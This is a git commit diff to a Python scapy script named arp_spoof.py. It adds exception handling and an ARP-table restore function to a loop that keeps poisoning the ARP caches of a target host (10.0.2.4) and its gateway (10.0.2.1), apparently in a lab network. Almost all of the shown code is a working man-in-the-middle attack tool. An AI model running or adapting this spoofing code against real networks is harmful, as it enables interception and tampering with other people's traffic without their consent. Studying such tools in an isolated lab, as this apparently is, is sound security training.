5a7328e8764e6b0f7c85aea0c91a518b67fa68e9
root <brawlwithprofessorenglish@gmail.com>
2018-12-04 02:30:21 -0500

    added exception handling and restoration of arp table

--- arp_spoof.py
+++ arp_spoof.py
@@ -19,11 +19,27 @@ def spoof(target_ip, spoof_ip):
     scapy.send(arp_packet, verbose=False)
 
 
+def restore(dedt_ip, src_ip):
+    arp_packet = scapy.ARP(op=2, pdst=dedt_ip, hwdst=get_mac(dedt_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
+    print(arp_packet.summary())
+    scapy.send(arp_packet, count=4, verbose=False)
+
+
 packet_count = 0
-while True:
-    spoof("10.0.2.4", "10.0.2.1")
-    spoof("10.0.2.1", "10.0.2.4")
-    packet_count = packet_count + 2
-    print("\r[+] packets send : " + str(packet_count)),
-    sys.stdout.flush()
-    time.sleep(2)
+
+target_ip = "10.0.2.4"
+gateway_ip = "10.0.2.1"
+try:
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        packet_count = packet_count + 2
+        print("\r[+] packets send : " + str(packet_count)),
+        sys.stdout.flush()
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("CRTL C entered.....Quitting ")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    print("ARP tables restored")
